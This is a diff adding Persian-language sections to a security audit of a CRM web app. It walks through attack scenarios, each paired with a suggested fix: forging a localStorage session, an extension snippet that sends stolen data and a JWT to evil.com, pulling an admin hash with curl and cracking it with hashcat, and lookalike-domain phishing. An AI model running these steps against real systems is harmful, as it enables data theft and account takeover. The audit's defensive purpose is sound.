@@ -173,3 +173,170 @@ ptf_crm_cheques, ptf_crm_invoices, ptf_crm_deals, ...
 - **۳ نقطه ضعف متوسط** وجود دارد که هیچ‌کدام به‌تنهایی منجر به نفوذ نمی‌شوند
 - یک هکر نیمه‌حرفه‌ای با ابزارهای استاندارد (Burp Suite, SQLMap, XSS Hunter) **نمی‌تواند** به سیستم نفوذ کند
 - یک هکر حرفه‌ای با دسترسی فیزیکی به دستگاه کاربر **فقط** می‌تواند داده‌های localStorage را بخواند — و این با رمزنگاری قابل رفع است
+
+---
+
+## 🔴 سناریوهای نفوذ توسط هکر حرفه‌ای
+
+### 💀 حمله ۱: Session Forgery — ورود بدون رمز با دسترسی فیزیکی
+
+**سطح خطر:** 🔴 بالا
+**پیش‌نیاز:** دسترسی فیزیکی به دستگاه کاربر (یا XSS موفق)
+
+**مراحل حمله:**
+```javascript
+// ۱. هکر کنسول مرورگر را باز می‌کند (F12)
+// ۲. یک session جعلی و توکن ساختگی می‌سازد:
+localStorage.setItem('ptf_crm_session', JSON.stringify({
+  user: 'fake', name: 'هکر', role: 'admin', roleId: 'admin'
+}));
+localStorage.setItem('ptf_crm_token', 'fake-token-xyz');
+
+// ۳. تابع showCrm را صدا می‌زند:
+showCrm();
+```
+
+**چرا کار می‌کند:**
+- `showCrm()` فقط **وجود** `ptf_crm_session` و `ptf_crm_token` در localStorage را چک می‌کند — نه **اعتبار** آن‌ها
+- `verifyRoleFromServer()` سرور را فراخوانی می‌کند ولی اگر سرور توکن جعلی را رد کند **CRM بسته نمی‌شود** — فقط `.catch()` اجرا و خطا بی‌صدا نادیده گرفته می‌شود
+- تمام `getData()` ها از `localStorage` می‌خوانند — **بدون نیاز به سرور**
+
+**نتیجه:** هکر **تمام داده‌های CRM ذخیره‌شده** (مشتریان، پیشنهادها، مالی، چک‌ها، رمزعبور هش‌شده کاربران) را می‌بیند. نمی‌تواند به سرور بنویسد (توکن جعلی رد می‌شود) ولی **خواندن کامل** دارد.
+
+**رفع پیشنهادی:**
+```javascript
+// showCrm باید توکن را سمت سرور validate کند قبل از نمایش CRM:
+async function showCrm() {
+  var s = JSON.parse(localStorage.getItem('ptf_crm_session') || '{}');
+  var token = localStorage.getItem('ptf_crm_token');
+  if (!s.user || !token) { ptfInvalidateSession(); return; }
+  // 🔒 تأیید سروری MANDATORY:
+  try {
+    var verify = await fetch('../api/crm.php?action=role_verify',
+      { headers: { 'X-CRM-Token': token }, cache: 'no-store' }).then(r => r.json());
+    if (!verify || !verify.ok) { ptfInvalidateSession('توکن منقضی/نامعتبر'); return; }
+  } catch (e) {
+    // آفلاین: فقط اگر آخرین تأیید سروری < ۲۴ ساعت پیش باشد
+    var lastVerify = +localStorage.getItem('ptf_last_verify') || 0;
+    if (Date.now() - lastVerify > 86400000) { ptfInvalidateSession('تأیید سرور لازم'); return; }
+  }
+  // ادامه...
+}
+```
+
+---
+
+### 💀 حمله ۲: Extension مخرب — سرقت بی‌صدای تمام داده‌ها
+
+**سطح خطر:** 🔴 بالا
+**پیش‌نیاز:** کاربر یک extension مرورگر مخرب (یا هک‌شده) نصب کرده
+
+**مراحل حمله:**
+```javascript
+// Extension با permission "storage" یا "*://*.pishtaj.ir/*":
+
+// ۱. سرقت تمام داده‌ها:
+var stolen = {};
+for (var i = 0; i < localStorage.length; i++) {
+  var k = localStorage.key(i);
+  if (k.startsWith('ptf_crm_')) stolen[k] = localStorage.getItem(k);
+}
+
+// ۲. سرقت توکن JWT:
+stolen.token = localStorage.getItem('ptf_crm_token');
+
+// ۳. ارسال به سرور هکر:
+fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(stolen) });
+
+// ۴. هکر با token دزدیده‌شده از دستگاه خودش API سرور را فراخوانی می‌کند:
+// (token به IP بسته نیست — از هر IP قابل استفاده است)
+```
+
+**چرا خطرناک:** توکن JWT فعلی **IP-bound نیست**. هر کس توکن داشته باشد از هر کجا API سرور را صدا می‌زند.
+
+**رفع پیشنهادی:**
+```php
+// auth_verify_token: بررسی IP مبدأ
+if ($info['ip'] !== ($_SERVER['REMOTE_ADDR'] ?? '')) return false;
+```
++ رمزنگاری AES-GCM روی تمام localStorage
+
+---
+
+### 💀 حمله ۳: SHA-256 Rainbow Table — شکستن رمز ادمین از هش عمومی
+
+**سطح خطر:** 🟡 متوسط-بالا
+**پیش‌نیاز:** هیچ (هش در سورس HTML عمومی قابل مشاهده است)
+
+**مراحل:**
+```bash
+# هکر هش را از index.html می‌خواند (بدون ورود):
+curl -s https://pishtaj.ir/crm/index.html | grep ADMIN_HASH
+
+# با hashcat + GPU (RTX 4090: ~10 میلیارد SHA-256/ثانیه):
+hashcat -m 1400 -a 3 f83b33... ?a?a?a?a?a?a?a?a
+# رمزهای ۸ کاراکتری: ~۴ ساعت
+# رمزهای ۶ کاراکتری: ~۳ دقیقه
+# رمزهای دیکشنری: ~۱ ثانیه
+```
+
+**نکته:** حتی اگر رمز شکسته شود، ورود بدون `ptf-secrets.php` روی سرور ممکن نیست. ولی:
+- اگر کاربر همین رمز را جای دیگر هم استفاده کرده باشد → **credential stuffing**
+- اطلاعات درباره الگوی رمزگذاری سازمان
+
+**رفع:** حذف `ADMIN_HASH` از سورس + مهاجرت به bcrypt
+
+---
+
+### 💀 حمله ۴: Targeted Phishing + Token Replay
+
+**سطح خطر:** 🟡 متوسط
+**پیش‌نیاز:** ایمیل/شماره یکی از کاربران CRM
+
+**مراحل:**
+1. هکر صفحه لاگین جعلی `pishtaj.ir.evil.com/crm/` می‌سازد
+2. ایمیل/پیامک به کاربر: «رمز شما منقضی شده — از اینجا وارد شوید»
+3. کاربر رمز واقعی را در سایت جعلی وارد می‌کند
+4. هکر رمز را می‌گیرد → به سایت واقعی وارد می‌شود → توکن JWT دریافت می‌کند
+5. توکن ۷ روز معتبر است و IP-bound نیست
+
+**رفع:** 2FA (رمز یکبارمصرف پیامکی) + IP-binding توکن
+
+---
+
+### 💀 حمله ۵: Supply Chain — بسته‌های third-party
+
+**سطح خطر:** 🟢 کم (فعلاً)
+
+CRM هیچ CDN/npm خارجی ندارد (همه فایل‌ها محلی). ولی:
+- `xlsx.min.js` (۲۸۰KB) — اگر این فایل از منبع غیررسمی باشد → backdoor
+- فونت `Vazirmatn` از assets محلی لود می‌شود (نه CDN) → ✅
+
+---
+
+## 📊 ماتریس مقایسه‌ای: نیمه‌حرفه‌ای vs حرفه‌ای
+
+| بردار حمله | هکر نیمه‌حرفه‌ای | هکر حرفه‌ای |
+|-----------|------------------|-------------|
+| Brute Force ورود | ❌ قفل ۶۰ثانیه | ❌ همچنان بسته |
+| SQL Injection | ❌ بدون SQL | ❌ بدون SQL |
+| XSS | ❌ escape شده | ❌ escape شده (ولی بدون CSP، اگر یکی از ۳۰۰۰ نقطه فراموش شود...) |
+| Session Forgery | ❌ نمی‌داند | 🔴 **با دسترسی فیزیکی: ۳۰ ثانیه تا ورود** |
+| Extension مخرب | ❌ نمی‌داند | 🔴 **سرقت کامل داده + توکن** |
+| Rainbow Table هش | ❌ نمی‌داند | 🟡 ممکن با GPU — ولی بدون سرور بی‌فایده |
+| Phishing | ❌ ساده | 🟡 Targeted phishing + token replay |
+| Man-in-the-Middle | ❌ HTTPS | ❌ HSTS مانع |
+| DNS Hijack + SW poison | ❌ نمی‌داند | ❌ HSTS مانع |
+| API unauthorized | ❌ JWT | ❌ JWT (ولی token IP-bound نیست!) |
+
+---
+
+## 🎯 ۵ اقدام فوری برای بستن مسیر هکر حرفه‌ای
+
+| # | اقدام | مسدود می‌کند | زمان | اولویت |
+|---|-------|-------------|------|--------|
+| 1 | **showCrm: تأیید سروری اجباری** + invalidate اگر سرور رد کرد | Session Forgery | ۱ ساعت | 🔴 |
+| 2 | **حذف ADMIN_HASH از سورس** | Rainbow Table | ۳۰ دقیقه | 🔴 |
+| 3 | **IP-binding توکن JWT** در auth_verify_token | Token Theft/Replay | ۱ ساعت | 🔴 |
+| 4 | **رمزنگاری AES-GCM روی localStorage** | Extension مخرب + فیزیکی | ۱ روز | 🟡 |
+| 5 | **CSP header** اضافه شود | XSS edge-case | ۱ ساعت | 🟡 |
